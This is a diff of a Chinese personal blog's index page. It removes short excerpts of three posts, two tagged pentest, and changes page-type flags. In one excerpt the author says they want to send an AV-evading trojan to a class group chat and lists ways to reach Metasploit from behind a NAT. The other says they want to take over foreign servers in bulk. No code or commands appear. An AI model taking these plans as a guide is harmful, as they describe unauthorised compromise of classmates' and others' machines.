-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-内网msf连接外网机器" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/10/29/内网msf连接外网机器/">内网msf连接外网机器</a>
-    </h1>
-  
-
-        
-        <a href="/2016/10/29/内网msf连接外网机器/" class="archive-article-date">
-  	<time datetime="2016-10-29T14:01:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-10-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：</p>
-<ul>
-<li>本机有独立ip。但是这个方法很容易被查水表的。</li>
-<li>VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡，</li>
-<li>通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）
-        
-          <a class="article-more-a" href="/2016/10/29/内网msf连接外网机器/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/10/29/内网msf连接外网机器/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-一些拿站的思路" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/09/30/一些拿站的思路/">JBoss的思路</a>
-    </h1>
-  
-
-        
-        <a href="/2016/09/30/一些拿站的思路/" class="archive-article-date">
-  	<time datetime="2016-09-29T22:37:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-09-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这些天一直在忙着别的事情，也没有刷洞，一直想 批量拿几台国外的服务器，玩一玩内网渗透，现在给出来现在的一些思路。<br>
-        
-          <a class="article-more-a" href="/2016/09/30/一些拿站的思路/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/09/30/一些拿站的思路/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="title-thinkings" class="article article-type-title  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/09/19/thinkings/">thinkings</a>
-    </h1>
-  
-
-        
-        <a href="/2016/09/19/thinkings/" class="archive-article-date">
-  	<time datetime="2016-09-19T12:34:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-09-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>公选老师在上面讲的我一脸懵逼，我还是默默掏出电脑歇息为写写感想吧<br>
-        
-          <a class="article-more-a" href="/2016/09/19/thinkings/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">生活</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/09/19/thinkings/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -968,8 +349,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
